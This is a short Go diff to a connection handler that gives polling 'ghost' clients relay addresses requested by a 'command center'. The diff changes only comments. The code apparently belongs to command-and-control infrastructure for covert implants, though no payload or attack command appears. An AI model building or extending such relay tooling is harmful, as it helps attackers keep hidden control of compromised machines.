@@ -108,10 +108,10 @@ func handleConnection(conn net.Conn) {
 		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: randomRelay})
 		fmt.Printf("[>] Session Randomized: %s is using Relay %s\n", id, randomRelay)
 	case "client_poll":
+		// Only send a relay address if a command center has requested one
 		if addr, exists := activeSessions[id]; exists {
 			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
-			// DELETE the session so the ghost doesn't get
-			// the same (potentially broken) route twice!
+			// IMPORTANT: Clear the session so the ghost goes back to idle polling
 			delete(activeSessions, id)
 		}
 		lastSeen[id] = time.Now()
